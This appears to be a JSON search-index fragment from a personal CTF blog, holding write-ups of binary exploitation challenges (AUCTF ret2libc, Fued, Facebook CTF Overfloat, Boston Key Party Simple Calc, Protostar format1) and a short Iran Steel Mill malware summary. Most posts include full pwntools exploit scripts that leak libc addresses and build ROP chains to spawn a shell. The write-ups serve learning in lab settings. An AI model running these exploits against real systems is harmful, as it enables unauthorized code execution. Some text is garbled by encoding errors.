stdin);\tif(strcmp(userName, \"admin\") != 0) {\t\tprintf(\"Invalid username entered. Try again.\\nIf you have recently registered, we are still working on saving credentials :(\\n\");\t\texit(1);\t}\telse {\t\tprintf(\"Welcome admin. The portal is still underconstruction so i'd suggest that you leave :(\\n\");\t\texit(0);\t}}void _register() {\tchar userName[SIZE];\tprintf(\"\\n\\nWelcome to the Registeration screen. Enter your username to add to database\\n&gt;&gt; \");\tfgets(userName, SIZE, stdin);\tif(strcmp(userName, \"admin\") != 0) {\t\tprintf(\"User already exists. Please try something else\\n&gt;&gt; \");\t\tgets(userName);\t}\telse {\t\tprintf(\"Successfully registered as admin!\\n\");\t}}void validate() {\tchar userName[SIZE];\tprintf(\"\\n\\nWelcome to the validation screen. Enter your username to check if it exists\\n&gt;&gt; \");\tfgets(userName, SIZE, stdin);\tif(strcmp(userName, \"admin\") != 0) {\t\tprintf(\"%s doesn't exist. Maybe because we're not keeping track of what exists and what doesn't :(\");\t\texit(1);\t}\telse {\t\tprintf(\"%s is a valid user!\\n\");\t\texit(0);\t}}int main(int argc, char* argv[]) {\tsetbuf(stdin, NULL);\tsetbuf(stdout, NULL);\tsetbuf(stderr, NULL);\tint uChoice;\tbanner();\tprintf(\"Welcome to AUCTF Secure Portal. Please choose one of the following:\\n\");\tprintf(\"1. Login\\n\");\tprintf(\"2. Register\\n\");\tprintf(\"3. Validate\\n\");\tprintf(\"0. Exit\\n\\n&gt;&gt; \");\tsecure_input(&amp;uChoice);\twhile(uChoice &lt; 0 || uChoice &gt; 3) {\t\tprintf(\"Invalid number entered. Try again\\n&gt;&gt; \");\t\tsecure_input(&amp;uChoice);\t}\tprintf(\"User entered: %d\\n\", uChoice);\tswitch(uChoice) {\t\tcase 1:\t\t\tlogin();\t\t\tbreak;\t\tcase 2:\t\t\t_register();\t\t\tbreak;\t\tcase 3:\t\t\tvalidate();\t\t\tbreak;\t\tcase 0:\t\t\texit(0);\t\tdefault:\t\t\tbreak;\t}\treturn 0;}Now it‚Äôs time to exploit this binary. For that, we will perform ret2libc. For defeating aslr we have to leak the libc function value from got and then use it to get the libc base address afterward all the rest is a piece of cake.#!/usr/bin/python3from pwn import *import structdef start(argv=[], *a, **kw): if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: return remote(sys.argv[1], sys.argv[2], *a, **kw) else: return process([exe] + argv, *a, **kw)exe = './backk'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\",checksec=False);def setting_libc(): # Leaking puts addres from got and then transfering execution to main function io.sendlineafter(b\"&gt;&gt;\",b\"2\") exe_rop.puts(elf.got.puts) exe_rop.main() leak = b\"A\"*135 leak += exe_rop.chain() io.sendlineafter(b\"&gt;&gt;\",leak) io.recvline() leak_raw = u32(io.recvline().strip(b\"&gt;&gt;\")[1:5]) libc.address = leak_raw - libc.symbols['puts'] def shell(): # exploiting same vuln to get shell libc_rop.system(next(libc.search(b\"/bin/sh\"))) libc_rop.exit() payload = b\"A\"*135 payload +=libc_rop.chain() io.sendlineafter(b\"&gt;&gt;\",b\"2\") io.sendlineafter(b\"&gt;&gt;\",payload)io = start()setting_libc()libc_rop = ROP(libc,checksec=False)shell()io.interactive()" }, { "title": "Fued pcc.nccs.qualify 2022", "url": "/posts/Fued_pcc.nccs_2022/", "categories": "Pwn, i386, ctf", "tags": "", "date": "2022-07-22 00:00:00 +0800", "snippet": "Purpose : Get The FlagWe see that no protection is enabled¬†and binary is 32-bit.Start by analyzing the main function. We can see that it prints the msg and then takes values from the user and store it in a character buffer of size 100. Later down the program, we can see that after some checks buffer is passed to the ‚Äúsafe‚Äù function.In the safe function we can see that the pass argument is copied to a variable that is on the stack because it has a 30 buffer size and we can overflow itAfter found the correct padd value (38{ 30 ( buff size ) + 4 (saved ebp ¬†) + 4( param_1 ) ¬†} ) we ¬†start writing exploit after going through function list found ‚Äúget_flag‚Äù function . Which will read the flag but only print if the correct argument is paced which is ‚Äú0xdeadbeef‚Äù and ‚Äú0xcaf3b33f‚Äù.Now complicated things are out of the way. My favorite part crafting the exploit.#!/usr/bin/python3from pwn import *import structdef start(argv=[], *a, **kw): if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # return remote(sys.argv[1], sys.argv[2], *a, **kw) else: return process([exe] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())exe = './fued'; elf = context.binary = ELF(exe, checksec=False);io = start()offset = 38payload = b\"A\"*38+p32(0x080491f6)+b\"A\"*4+p32(0xdeadbeef)+p32(0xcaf3b33f) io.sendlineafter(b\"Enter the key that you received when registering:\",payload)io.interactive()‚Äú„Éñ„Éº„É†‚Äù„ÄÇ Êóó„ÇíÂèó„ÅëÂèñ„Å£„Åü" }, { "title": "Facebook CTF 2019 Overfloat", "url": "/posts/nightmare-08-fb_overfloat/", "categories": "Pwn, amd64, Binary Exploitation, nightmare, module08", "tags": "", "date": "2022-07-11 00:00:00 +0800", "snippet": "Purpose : Get shell on systemLet‚Äôs start by checking restrictions on binary.Only Stack is not executable which kills the¬†possibility of putting shellcode in vuln_buffer and jumping to it.Start reversing by analyzing the main¬†function. We can see that usage of settbuff functions so binary works correctly with network sockets. Then puts print ASCII art. Memset function¬† is used to clear out an¬†array with zero. Pass pointer of Char array to ‚Äúchart_course ‚Äú function. Then msg is printed and the function exits.Now it‚Äôs time to analyze the chart_course function. Loop is created which can only be exited¬†if the user inputs ‚Äúdone‚Äù. This loop is overflowing as we will be seeing in a minute. We can ignore some parts of the code as it is printing ‚ÄúLAT‚Äù on even and ‚ÄúLON‚Äù on odd. fget¬†function is used to take take ‚Äú100‚Äù bytes input from the user and store it in local_78. Next, we see first 4 bytes are taken from the local_78 variable and compared to the ‚Äúdone‚Äù string if compare is successful function is exited, and if not rest of the code carries on. As we go down we can see atof function is used to convert a string into float and then save it in dvar2 (This part will be important while building an exploit because it controls what is placed on the stack ). dvar2 value is saved to local_10. memset is used to clear values in dvar2. This part is important because be Attentive address of char_array is incremented on every loop by 4 bytes using the loop counter multiplied by 4 and then local_10 content is saved on that address. This part is which creates buffer overflow as no checks are placed.Now it‚Äôs time to start building an¬†exploit. To bypass aslr and create a rop chain we have to find libc base address. For calculating base address we leak puts address from got and then subtract from the offset of puts to get base_address then transfer execution to the main function. This time exploiting the same vuln we can get shell we have to create a rop chain to call system function while passing ‚Äú/bin/sh‚Äù strings. It‚Äôs all ez most important and the time-consuming thing was building format function. As I stated earlier atof function converts float value in string form to float data type as all this is handled in flu (special register xmm0,ymm0,zmm0 for floating-point arithmetic ). So when values from special registers are placed on memory are in hex form. To put what hex values should be placed on memory I came up with this idea (it barely does its work there will be a better way to solve this issue ).#!/usr/bin/python3 from pwn import *import structdef start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''continue'''.format(**locals())exe = './overfloat'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(exe,checksec=False)libc = ELF(\" &lt;add full path to libc &gt; \",checksec=False)ld = ELF(\" &lt;add full path to ld &gt; \",checksec=False)######### hardcode ########plt_puts = elf.plt['puts'] got_puts = elf.got['puts'] pop_rdi = exe_rop.find_gadget(['pop rdi','ret'])[0] main = elf.symbols['main'] ret = exe_rop.find_gadget(['ret'])[0] ###########################def format(recv_value): x = bytes(str(struct.unpack(\"f\",(p64(recv_value)[4:8]))).strip(\"(\").strip(\",)\"),\"utf-8\") y = bytes(str(struct.unpack(\"f\",(p64(recv_value)[0:4]))).strip(\"(\").strip(\",)\"),\"utf-8\") io.sendlineafter(b\"]:\",y) io.sendlineafter(b\"]:\",x)def leak_value(): for x in range(7): format(0x0000000000000000) format(pop_rdi) format(got_puts) format(plt_puts) format (main) io.sendlineafter(b\"]:\",b\"done\") io.recvline() raw = io.recvline().strip(b\"\\n\") leak_add = u64(raw + b\"\\x00\"*(8-len(raw))) libc.address = leak_add - libc.symbols['puts'] print(\"leak value\",hex(libc.address))def exploit(): for x in range(7): format(0x4242424242424242) format(pop_rdi) format(next(libc.search(b\"/bin/sh\"))) format(ret) format(libc.symbols['system']) io.sendlineafter(b\"]:\",b\"done\")io = start()leak_value()exploit()io.interactive()" }, { "title": "Iran Steel Mill malware", "url": "/posts/iran-steel/", "categories": "Malware, win", "tags": "", "date": "2022-06-30 00:00:00 +0800", "snippet": "Summary : Chaplin.exe runs which disable all network adapters and look for screen.exe then executes it. Screen.exe will delete the lsa registry key. Start the video and open the registry, which stops the administrator from redo changes to the registry value.Initial Detail insight :Disabling All Network AdapterDeleting lsa entry will make the computer unusable after a force reboot (windows will be in a boot loop and will not be able to get to the login screen)Stop Administrator from modifying registry value because RegeCloseKey function is never called after calling RegFlushKeyMore Detail on RegFlushKey ()This function is Running ‚ÄúVideo.wav‚ÄùScreen Shot of the videoIOCs:837e9bb07d884385d077d4ea77797df894c2aa418ae356820ee15efc7bfeb923b86678403d77efbdba3d2b1c93500dfc" }, { "title": "Boston Key Part 2016 Simple Calc", "url": "/posts/nightmare-07-simplecalc/", "categories": "Pwn, amd64, Binary Exploitation, nightmare, module07", "tags": "", "date": "2022-06-28 00:00:00 +0800", "snippet": "Let‚Äôs start reversing it with the main function first we see that a value is taken which is stored in the no_loops variable ( Int )¬† then it is used to create a loop, used as a size for allocating memory on the heap, and also use to control how much memory is to be copied from¬† heap to stack¬† then input is taken from user to select¬†what type of function is to be executed (1. addition, 2. subtraction, 3. multiplication, 4. division and 5. copy memory from heap to stack ) after the loop is completely free is used to free up heap memory¬†and program exitsAdd functionIn Add function, we can see that it takes 2 input and then store it in a global variable and then check if it is greater than 39 then it will add two values and store them in a third global variable, and then the exit function and if it is smaller than 39 than prints a msg and exit without doing anythingRest of the function doing as the name suggests sub,mul, and divide but with the same restrictions as add function (check the value if its greater than 39)Now we have a general view of the program let‚Äôs start working on getting shellThe first vuln I can find is that the stack has limited space ( 40 bytes ) and the number of bytes to be copied is controlled by the userno_loops is controlled by userNow its time to fill the heap with values like its stack (because it will be placed on the stack ) for that we see that after the calculation function ( add, sub, mul, div) we can see that the global value is placed on the heap¬†every time on a different address (because of for_loop multiplying by the address which is incrementing the address value )Now its time to start working on the exploit first we start by padding . One important thing we will do is overwrite the heap pointer which will be used by the free function to free memory to bypass we will add that variable with ‚Äúzero‚Äù so the free function closes without error and rest of padding till we control instruction pointer rest of is simple creating rope chain.Now for rop chain our goal is to get shell so we can use sys_execv syscall (man execv ) to call ‚Äú/bin/sh‚Äù for that we have to put the string ‚Äú/bin/sh‚Äù in memory then put the memory pointer to rsi register we can put ‚Äú0x0‚Äù in rest of register (rdi,rdx) and then put ‚Äú0x3b‚Äù (which is number of sys_execv)¬† ¬†in rax and call syscall rop gadget and¬† u got a shell on the system (THis was the second-best challenge after sandbox escape )#!/usr/bin/python3from pwn import *def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw)# Specify GDB script here (breakpoints etc)gdbscript = '''break *main+518continue'''.format(**locals())# break *0x0000000000401545exe = \"./simplecalc\" ; elf = context.binary=ELF(exe,checksec=False)rop= ROP(exe,checksec=False)def menu(menu_no,menu_x,menu_y): io.sendlineafter(b\"=&gt;\",menu_no) io.sendlineafter(b\"Integer x: \",menu_x) io.sendlineafter(b\"Integer y: \",menu_y) io.recvline()def zero (): menu(b\"2\",b\"2000\",b\"2000\")def format_f(fromat_value): x = int(fromat_value) - 50000 menu(b\"1\",str(x),b\"50000\") zero()def padd (): for x in range(18): zero()#### ROP #############mov_ptr_rax_rdx_ret = 0x000000000044526e # mov qword ptr [rax], rdx; ret; pop_rdi = 0x0000000000401b73pop_rdx = 0x0000000000437a85pop_rax = 0x000000000044db34pop_rsi = 0x0000000000401c87syscall = 0x00000000004648e5bin_var = 0x6e69622fsh_var = 0x68732f######################io = start ()io.sendlineafter(b\"Expected number of calculations: \",b\"150\")padd ()format_f(pop_rdx)format_f(bin_var)format_f(pop_rax)format_f(0x6c0008)format_f(mov_ptr_rax_rdx_ret)format_f(pop_rax)format_f(0x6c000c)format_f(pop_rdx)format_f(sh_var)format_f(mov_ptr_rax_rdx_ret)format_f(pop_rdi)format_f(0x6c0008)format_f(pop_rsi)format_f(0x0)format_f(pop_rdx)format_f(0x0)format_f(pop_rax)format_f(0x3b)format_f(syscall)io.sendlineafter(b\"=&gt;\",b\"5\")io.interactive()" }, { "title": "Exploit Education (Protostart Format 1)", "url": "/posts/protostar-foramt1/", "categories": "Pwn, i386, Binary Exploitation, exploit.education", "tags": "", "date": "2022-06-26 00:00:00 +0800", "snippet": "GoalPrint ‚Äúyou have modified the target :) ‚Äúlet‚Äôs dig into the source code of the binary/* Source Code Of Challenge */#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int target;void vuln(char *string){ printf(string); if(target) { printf(\"you have modified the target :)\\n\"); }}int main(int argc, char **argv){ vuln(argv[1]);}At first glance, we can see that the target value is initialized and then if the statement is checking if it‚Äôs modified or not if its limited it prints the msg and if not function exists and then the program let dig in more we can see that main is taking the first argument passed to it and giving it to vuln function is taking that input and printing it with any format specifier which makes it to vulnerable to format string vuln (Format string vuln is in which user pass input which is not sanitized properly which can then be used to leak value from memory or write to memory using format specifier which the user provided) we can use it to modified target variable so we can print the msgobjdump -t format1 | grep \"target\"# get address of target variablegcc -m32 -fno-stack-protector -z execstack -no-pie -w -D_FORTIFY_SOURCE=0 -O0 format1.c -o format1# compile binary aslr is offNote : this payload will not work for u because of enviroment variable" } ]
